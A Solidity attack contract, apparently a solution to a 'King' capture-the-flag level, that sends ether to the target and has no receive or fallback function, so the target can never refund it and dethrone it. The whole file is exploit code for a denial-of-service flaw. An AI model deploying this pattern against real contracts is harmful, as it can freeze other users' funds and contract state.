// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract Attack {
    King public kingContract;

    constructor(address payable _kingContract) {
        kingContract = King(_kingContract);
    }

    function attack() public payable {
        address payable addr = payable(address(kingContract));

        (bool success, ) = addr.call{value: msg.value}("");

        require(success, "call failed");
    }
}
